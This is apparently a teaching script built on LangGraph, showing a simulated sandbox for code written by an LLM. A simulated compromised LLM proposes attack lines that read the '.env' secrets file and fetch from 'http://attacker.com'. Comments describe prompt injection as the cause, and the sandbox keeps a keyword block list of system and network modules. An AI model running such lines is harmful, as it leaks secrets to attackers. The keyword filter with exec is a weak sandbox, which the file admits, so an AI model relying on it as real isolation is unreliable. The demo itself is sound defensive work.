from typing import Literal, Optional, TypedDict

from langgraph.graph import END, START, StateGraph


# ==========================================
# 1. State Schema
# ==========================================
class AgentState(TypedDict):
    scenario: str
    
    # LLM Output (Untrusted Python Code)
    proposed_python_code: str
    
    # Execution Output
    sandbox_result: str

# ==========================================
# 2. Nodes
# ==========================================
def llm_node(state: AgentState):
    """
    Simulates an LLM generating Python code to solve a task.
    If the LLM is compromised, it generates malicious payloads!
    """
    print(f"\n{'='*60}\n[Scenario]: {state['scenario']}")
    print("  [Agent] Generating Python code...")
    
    if state["scenario"] == "Safe Math Operation":
        code = "result = 125000 * 0.15"
        
    elif state["scenario"] == "Host Filesystem Attack":
        code = "import os\nresult = open('.env', 'r').read()"
        
    elif state["scenario"] == "Network Exfiltration Attack":
        code = "import urllib.request\nresult = urllib.request.urlopen('http://attacker.com').read()"
        
    print(f"  [Agent] Proposed Code:\n{code}")
    return {"proposed_python_code": code}


def sandbox_execution_node(state: AgentState):
    """
    The Sandboxed Environment. 
    In production, this is a separate Docker container with no network/filesystem access.
    Here, we simulate a sandbox by aggressively intercepting illegal modules and commands.
    """
    code = state["proposed_python_code"]
    print("  [Sandbox] Intercepting code for isolated execution...")
    
    # --- SANDBOX SECURITY BOUNDARIES (Simulated) ---
    forbidden_keywords = ["import os", "open(", "import urllib", "import requests", "import subprocess", "__import__"]
    
    for keyword in forbidden_keywords:
        if keyword in code:
            print(f"    -> SANDBOX VIOLATION: Blocked attempt to use restricted system capability: '{keyword}'")
            return {"sandbox_result": f"SecurityError: Execution of '{keyword}' is blocked in this sandbox."}
    
    # --- SAFE EXECUTION ---
    print("    -> Sandbox checks passed. Executing code in isolated namespace.")
    
    # We use a restricted globals dictionary to prevent access to built-in functions
    restricted_globals = {"__builtins__": {}}
    local_namespace = {}
    
    try:
        # DO NOT DO THIS IN PRODUCTION WITHOUT A REAL CONTAINER!
        exec(code, restricted_globals, local_namespace)
        result = local_namespace.get("result", "No result variable returned.")
        print(f"    -> Execution Output: {result}")
        return {"sandbox_result": str(result)}
    except Exception as e:
        print(f"    -> Execution Error: {e}")
        return {"sandbox_result": f"Error: {e}"}

# ==========================================
# 3. Build Graph
# ==========================================
builder = StateGraph(AgentState)
builder.add_node("llm", llm_node)
builder.add_node("sandbox", sandbox_execution_node)

builder.add_edge(START, "llm")
builder.add_edge("llm", "sandbox")
builder.add_edge("sandbox", END)

graph = builder.compile()

# ==========================================
# 4. Execution APIs
# ==========================================
def run_sandbox_test(scenario: str):
    initial_state = {"scenario": scenario, "proposed_python_code": "", "sandbox_result": ""}
    final_state = graph.invoke(initial_state)
    print(f"  [System Result]: {final_state['sandbox_result']}")


# 1. The LLM calculates taxes safely
run_sandbox_test("Safe Math Operation")

# 2. A prompt injection tricks the LLM into trying to steal the .env file!
run_sandbox_test("Host Filesystem Attack")

# 3. A prompt injection tricks the LLM into downloading a payload from the internet!
run_sandbox_test("Network Exfiltration Attack")